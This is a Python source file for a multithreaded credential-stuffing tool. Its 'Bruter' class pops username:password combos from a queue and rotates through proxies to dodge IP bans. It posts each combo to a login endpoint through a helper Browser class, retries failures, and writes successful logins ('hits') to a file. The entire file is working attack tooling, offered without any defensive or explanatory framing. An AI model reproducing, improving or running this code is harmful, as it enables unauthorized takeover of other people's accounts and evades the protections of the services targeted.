from .browser import Browser
from .const import (response_success, response_error)

from threading import Thread
from time import sleep


class Bruter:

    def __init__(self, input_max_threads, combo_queue, proxy_manager, path_hits_file):
        self.combo_queue = combo_queue
        self.proxy_manager = proxy_manager
        self.path_hits_file = path_hits_file
        self.bots = []
        self.last_combo = ['', '']
        self.max_threads = input_max_threads
        self.hits = 0
        self.tested = 0
        self.retries = 0
        self.isAlive = False

    def login(self, combo, proxy):
        try:
            browser = Browser()
            browser.create()
            browser.set_details(combo, proxy)
            browser.set_header()
            browser.build_payload()
            response = browser.post()

            if response.ok:
                if response_error not in response.text:
                    self.proxy_manager.disable(proxy, tested=True)
                    self.tested += 1
                    self.last_combo = combo

                    if response_success in response.text:
                        hits_file = open(self.path_hits_file, 'a+', encoding='utf-8', errors='ignore')
                        hits_file.write(combo[0] + ':' + combo[1] + '\n')
                        hits_file.close()
                        self.hits += 1
                else:
                    self.proxy_manager.disable(proxy)
                    self.combo_queue.appendleft(combo)
                    self.retries += 1

            else:
                raise()

        except:
            self.proxy_manager.disable(proxy, retries=True, ban_flag=True)
            self.combo_queue.appendleft(combo)
            self.retries += 1

    def bot(self):
        while self.isAlive:
            try:
                combo = None
                proxy = None
                combo = self.combo_queue.popleft()
                proxy = self.proxy_manager.get()
                self.login(combo, proxy)

            except IndexError:
                if combo and not proxy:
                    self.combo_queue.appendleft(combo)

                sleep(1)

    def stop(self):
        self.isAlive = False
        for bot in self.bots:
            bot.join()

    def start(self):
        self.isAlive = True
        for i in range(self.max_threads):
            t = Thread(target=self.bot)
            t.daemon = True
            t.start()
            self.bots.append(t)
